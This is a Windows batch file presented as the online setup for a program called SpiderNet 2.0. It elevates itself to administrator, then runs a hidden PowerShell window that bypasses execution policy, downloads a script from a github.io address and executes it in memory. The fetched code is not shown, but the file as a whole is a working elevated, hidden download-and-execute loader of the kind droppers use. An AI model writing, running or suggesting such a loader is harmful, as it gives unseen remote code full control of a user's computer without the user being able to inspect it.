@echo off
rem SpiderNet 2.0 - online setup. Downloads the latest installer script and runs it as administrator.
net session >nul 2>&1
if errorlevel 1 (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12'; $b=(New-Object Net.WebClient).DownloadData('https://privat-allin.github.io/spidernet-cloud/setup/install.ps1?'+[DateTime]::Now.Ticks); iex ([Text.Encoding]::UTF8.GetString($b).TrimStart([char]0xFEFF))"
